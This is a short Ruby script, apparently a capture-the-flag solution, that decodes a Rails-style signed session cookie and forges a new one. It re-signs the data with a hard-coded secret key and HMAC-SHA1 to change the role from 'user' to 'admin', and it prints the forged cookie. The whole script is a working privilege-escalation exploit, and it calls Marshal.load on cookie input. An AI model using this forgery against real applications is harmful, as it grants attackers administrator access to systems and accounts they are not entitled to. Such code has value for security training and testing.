require 'base64'
require 'cgi'
require 'openssl'

def decode(cookie)
  Marshal.load(Base64.decode64(CGI.unescape(cookie.split("\n").join).split('--').first))
end

def encode(data, key)
  cookie = Base64.strict_encode64(Marshal.dump(data)).chomp
  digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, key, cookie)
  "#{cookie}--#{digest}"
end

puts decode('BAh7CEkiDXVzZXJuYW1lBjoGRUZJIgl0b3RvBjsAVEkiCXJvbGUGOwBGSSIJ%0AdXNlcgY7AFRJIg9zZXNzaW9uX2lkBjsAVEkiRTk4YTlmOTc0OGIyM2QwOTZh%0AZDg2MDg1MTk4MzExZTZmNTRkNWI0OTNmZDhlN2M2MDMyYTVjMDM5YjM1ZWRi%0AMDkGOwBG%0A--a4f46711a8cb34d67311e7b9d8677d8aa18fca68')
# {"username"=>"toto", "role"=>"user", "session_id"=>"ef5e0b70b11f5060bf25a77e9fe6348dfc5df8e75716f82019bd8bdfc05787e4"}

data = {"username"=>"success", "role"=>"admin", "session_id"=>"98a9f9748b23d096ad86085198311e6f54d5b493fd8e7c6032a5c039b35edb09"}
puts encode(data, '01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85')
# BAh7CEkiDXVzZXJuYW1lBjoGRVRJIgxzdWNjZXNzBjsAVEkiCXJvbGUGOwBUSSIKYWRtaW4GOwBUSSIPc2Vzc2lvbl9pZAY7AFRJIkU5OGE5Zjk3NDhiMjNkMDk2YWQ4NjA4NTE5ODMxMWU2ZjU0ZDViNDkzZmQ4ZTdjNjAzMmE1YzAzOWIzNWVkYjA5BjsAVA==--f3225e0c91da7a9f0600257f3ffd7a402a5dc146

